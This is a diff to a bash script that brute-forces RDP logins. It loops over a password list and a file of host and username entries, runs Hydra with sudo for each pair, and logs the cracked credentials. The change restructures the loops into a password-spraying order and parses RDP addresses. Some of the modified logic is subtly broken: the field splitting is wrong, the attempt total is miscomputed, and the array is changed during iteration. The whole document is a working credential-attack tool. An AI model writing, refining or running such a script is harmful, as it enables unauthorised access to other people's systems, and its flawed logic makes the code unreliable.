@@ -16,13 +16,12 @@ fi
 > "$success_log_file"
 > "$error_log_file"
 
-# Read all IP:username pairs into an array, filter out empty lines
+# Read all RDP entries into an array, filter out empty lines
 mapfile -t iplog_entries < <(grep -v '^$' "$iplog_file")
 # Read all passwords into an array, filter out empty lines
 mapfile -t passwords < <(grep -v '^$' "$passwords_file")
 
-# Get the total number of attempts
-total_attempts=$(( ${#iplog_entries[@]} * ${#passwords[@]} ))
+# Initialize variables
 current_attempt=0
 successful_attempts=0
 start_time=$(date +%s)
@@ -34,7 +33,6 @@ display_progress() {
     local total_attempts=$3
     local successful_attempts=$4
     local current_password=$5
-    local current_host=$6
 
     local percent=$(( (current_attempt * 100) / total_attempts ))
     local estimated_time_left=$(( (elapsed_time * total_attempts / current_attempt) - elapsed_time ))
@@ -45,7 +43,7 @@ display_progress() {
     tput clear
     echo "Total Attempts: $total_attempts"
     echo "Progress: $current_attempt / $total_attempts ($percent%)"
-    echo "Currently checking password: '$current_password' for host: '$current_host'"
+    echo "Currently checking password: '$current_password'"
     echo "Successful logins: $successful_attempts"
     echo "Time elapsed: $(date -u -d @$elapsed_time +%H:%M:%S)"
     echo "Current Speed: $attempts_per_minute attempts/minute"
@@ -58,26 +56,27 @@ display_progress() {
 # Print initial UI
 echo "Attempting logins..."
 
-# Loop through each entry in iplog.txt
-for entry in "${iplog_entries[@]}"; do
-    IFS=: read -r full_url target_name <<< "$entry"
-    
-    # Check if the full_url and target_name are not empty
-    if [[ -z "$full_url" || -z "$target_name" ]]; then continue; fi
+# Loop through each password
+for password in "${passwords[@]}"; do
+    # Ensure the password is not empty
+    if [[ -z "$password" ]]; then continue; fi
 
-    # Loop through each password
-    for password in "${passwords[@]}"; do
-        # Ensure the password is not empty
-        if [[ -z "$password" ]]; then continue; fi
+    # Loop through each entry in iplog.txt
+    for entry in "${iplog_entries[@]}"; do
+        IFS="://" read -r protocol full_url <<< "$entry"
+        IFS=":" read -r rdp_ip target_name <<< "$full_url"
+
+        # Check if the rdp_ip and target_name are not empty
+        if [[ -z "$rdp_ip" || -z "$target_name" ]]; then continue; fi
 
         # Run Hydra for each username and password pair, capturing output
-        if sudo hydra -l "$target_name" -p "$password" "$full_url" -t 5 -W 4 | grep -q "login successful"; then
-            echo "Successful login with $target_name on $full_url using password: $password" >> "$success_log_file"
+        if sudo hydra -l "$target_name" -p "$password" "$rdp_ip" -t 5 -W 4 | grep -q "login successful"; then
+            echo "Successful login with $target_name on $rdp_ip using password: $password" >> "$success_log_file"
             successful_attempts=$((successful_attempts + 1))
         else
-            echo "Failed login attempt for $target_name on $full_url using password: $password" >> "$error_log_file"
+            echo "Failed login attempt for $target_name on $rdp_ip using password: $password" >> "$error_log_file"
         fi
-
+        
         # Update current attempt count
         current_attempt=$((current_attempt + 1))
         
@@ -85,8 +84,11 @@ for entry in "${iplog_entries[@]}"; do
         elapsed_time=$(( $(date +%s) - start_time ))
 
         # Display progress
-        display_progress "$elapsed_time" "$current_attempt" "$total_attempts" "$successful_attempts" "$password" "$full_url"
+        display_progress "$elapsed_time" "$current_attempt" "$((${#iplog_entries[@]} * 1))" "$successful_attempts" "$password"
     done
+
+    # Remove the password from the list after checking
+    passwords=("${passwords[@]:1}")  # Remove the first element (the checked password)
 done
 
 # Final output
